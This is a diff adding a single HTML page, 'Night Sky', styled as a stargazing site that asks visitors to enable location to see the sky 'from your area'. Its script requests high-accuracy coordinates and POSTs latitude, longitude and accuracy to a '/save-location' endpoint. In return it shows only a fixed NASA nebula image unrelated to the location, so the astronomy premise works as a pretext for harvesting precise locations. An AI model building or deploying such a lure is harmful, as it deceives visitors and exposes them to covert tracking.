@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Night Sky</title>
+
+<style>
+
+*{
+box-sizing:border-box;
+}
+
+html{
+scroll-behavior:smooth;
+}
+
+body{
+
+margin:0;
+min-height:100vh;
+
+overflow-x:hidden;
+overflow-y:auto;
+
+font-family:Arial,sans-serif;
+
+color:white;
+text-align:center;
+
+background:
+radial-gradient(circle at 15% 10%,rgba(60,40,160,.28),transparent 30%),
+radial-gradient(circle at 85% 80%,rgba(20,80,150,.20),transparent 35%),
+linear-gradient(135deg,#01030a,#050918,#0b1025);
+
+}
+
+body::before{
+
+content:"";
+
+position:fixed;
+inset:0;
+
+background-image:
+radial-gradient(white 1px,transparent 1px),
+radial-gradient(white 1px,transparent 1px);
+
+background-size:90px 90px,150px 150px;
+
+background-position:10px 20px,50px 80px;
+
+opacity:.35;
+
+pointer-events:none;
+
+}
+
+.container{
+
+position:relative;
+z-index:2;
+
+width:92%;
+max-width:650px;
+
+margin:auto;
+
+padding:65px 0 80px;
+
+}
+
+.logo{
+
+font-size:55px;
+
+margin-bottom:10px;
+
+text-shadow:
+0 0 25px rgba(140,100,255,.6);
+
+}
+
+h1{
+
+margin:10px 0;
+
+font-size:42px;
+
+line-height:1.15;
+
+}
+
+.subtitle{
+
+max-width:530px;
+
+margin:20px auto 0;
+
+color:#aeb8d5;
+
+font-size:17px;
+
+line-height:1.7;
+
+}
+
+
+/* PURPLE LOCATION BOX */
+
+.location-box{
+
+margin-top:35px;
+
+padding:32px 22px;
+
+border-radius:26px;
+
+
+/* purple glass */
+
+background:
+linear-gradient(
+135deg,
+rgba(105,65,190,.38),
+rgba(55,30,110,.28)
+);
+
+border:
+1px solid
+rgba(170,130,255,.45);
+
+backdrop-filter:
+blur(16px);
+
+-webkit-backdrop-filter:
+blur(16px);
+
+
+/* purple glow */
+
+box-shadow:
+
+0 0 18px
+rgba(120,70,220,.25),
+
+0 15px 55px
+rgba(0,0,0,.55),
+
+inset 0 0 30px
+rgba(120,70,220,.12);
+
+}
+
+.location-icon{
+
+font-size:34px;
+
+margin-bottom:10px;
+
+filter:
+drop-shadow(
+0 0 10px
+rgba(160,120,255,.7)
+);
+
+}
+
+.location-text{
+
+color:#d7d0ef;
+
+line-height:1.6;
+
+}
+
+button{
+
+width:auto;
+
+margin-top:20px;
+
+padding:15px 30px;
+
+border:none;
+
+border-radius:40px;
+
+background:#f5f3ff;
+
+color:#080516;
+
+font-size:16px;
+
+font-weight:bold;
+
+cursor:pointer;
+
+box-shadow:
+0 10px 35px rgba(0,0,0,.5);
+
+transition:
+transform .2s ease,
+opacity .2s ease;
+
+}
+
+button:active{
+
+transform:scale(.96);
+
+}
+
+button:disabled{
+
+opacity:.65;
+
+cursor:wait;
+
+}
+
+#result{
+
+margin-top:30px;
+
+}
+
+.loading{
+
+color:#bfc8df;
+
+line-height:1.7;
+
+}
+
+.nebula{
+
+width:100%;
+
+max-width:600px;
+
+display:block;
+
+margin:25px auto 0;
+
+border-radius:24px;
+
+box-shadow:
+0 20px 60px
+rgba(0,0,0,.65);
+
+}
+
+.enjoy{
+
+margin-top:25px;
+
+font-size:30px;
+
+font-weight:bold;
+
+text-shadow:
+0 0 25px
+rgba(150,100,255,.5);
+
+}
+
+.enjoy-text{
+
+margin-top:10px;
+
+color:#aeb8d5;
+
+font-size:16px;
+
+line-height:1.7;
+
+}
+
+.error{
+
+color:#cbd3e8;
+
+line-height:1.7;
+
+}
+
+@media(max-width:600px){
+
+.container{
+
+padding-top:50px;
+
+}
+
+h1{
+
+font-size:32px;
+
+}
+
+.subtitle{
+
+font-size:15px;
+
+}
+
+.location-box{
+
+padding:28px 17px;
+
+}
+
+button{
+
+width:100%;
+
+}
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<main class="container">
+
+
+<div class="logo">
+✦
+</div>
+
+
+<h1>
+Explore the Night Sky
+</h1>
+
+
+<p class="subtitle">
+
+Turn on your location to discover
+a glimpse of the universe from your area.
+
+</p>
+
+
+<section class="location-box">
+
+
+<div class="location-icon">
+🐰💤
+</div>
+
+
+<div class="location-text">
+
+Allow location access to continue
+and discover something beautiful
+from the cosmos.
+
+</div>
+
+
+<button
+id="locationButton"
+onclick="getLocation()"
+>
+
+📍 Turn On Location
+
+</button>
+
+
+</section>
+
+
+<div id="result"></div>
+
+
+</main>
+
+
+<script>
+
+function getLocation(){
+
+const result =
+document.getElementById("result");
+
+const button =
+document.getElementById("locationButton");
+
+
+if(!navigator.geolocation){
+
+result.innerHTML=`
+
+<p class="error">
+
+Location is not supported
+by your browser.
+
+</p>
+
+`;
+
+return;
+
+}
+
+
+button.disabled=true;
+
+button.innerHTML=
+"📡 Finding Location...";
+
+
+result.innerHTML=`
+
+<p class="loading">
+
+🌌 Finding your location...
+
+</p>
+
+`;
+
+
+navigator.geolocation.getCurrentPosition(
+
+async function(position){
+
+const latitude =
+position.coords.latitude;
+
+const longitude =
+position.coords.longitude;
+
+const accuracy =
+position.coords.accuracy;
+
+
+try{
+
+const response =
+await fetch(
+"/save-location",
+{
+
+method:"POST",
+
+headers:{
+"Content-Type":
+"application/json"
+},
+
+body:JSON.stringify({
+
+latitude:latitude,
+
+longitude:longitude,
+
+accuracy:accuracy
+
+})
+
+}
+);
+
+
+const data =
+await response.json();
+
+
+if(data.success){
+
+result.innerHTML=`
+
+<img
+
+class="nebula"
+
+src="https://images-assets.nasa.gov/image/PIA12348/PIA12348~orig.jpg"
+
+alt="Nebula"
+
+>
+
+
+<div class="enjoy">
+
+✨ Enjoy Your Sky
+
+</div>
+
+
+<p class="enjoy-text">
+
+Your location has been received.
+
+<br>
+
+Keep looking up. 🌌
+
+</p>
+
+`;
+
+
+button.innerHTML=
+"✓ Location Received";
+
+
+}else{
+
+button.disabled=false;
+
+button.innerHTML=
+"📍 Try Again";
+
+
+result.innerHTML=`
+
+<p class="error">
+
+Could not receive your location.
+Please try again.
+
+</p>
+
+`;
+
+}
+
+
+}catch(error){
+
+button.disabled=false;
+
+button.innerHTML=
+"📍 Try Again";
+
+
+result.innerHTML=`
+
+<p class="error">
+
+Could not connect to
+the server.
+
+</p>
+
+`;
+
+}
+
+},
+
+
+function(error){
+
+button.disabled=false;
+
+button.innerHTML=
+"📍 Turn On Location";
+
+
+if(error.code===1){
+
+result.innerHTML=`
+
+<p class="error">
+
+📍 Location permission
+was not allowed.
+
+<br>
+
+Please allow it and try again.
+
+</p>
+
+`;
+
+}
+
+else if(error.code===2){
+
+result.innerHTML=`
+
+<p class="error">
+
+📡 Location could not be found.
+
+<br>
+
+Please turn on your phone's
+Location service and try again.
+
+</p>
+
+`;
+
+}
+
+else if(error.code===3){
+
+result.innerHTML=`
+
+<p class="error">
+
+⏱️ Location took too long.
+
+<br>
+
+Please try again.
+
+</p>
+
+`;
+
+}
+
+else{
+
+result.innerHTML=`
+
+<p class="error">
+
+Unable to get your location.
+Please try again.
+
+</p>
+
+`;
+
+}
+
+},
+
+{
+
+enableHighAccuracy:true,
+
+timeout:15000,
+
+maximumAge:0
+
+}
+
+);
+
+}
+
+</script>
+
+
+</body>
+
+</html>
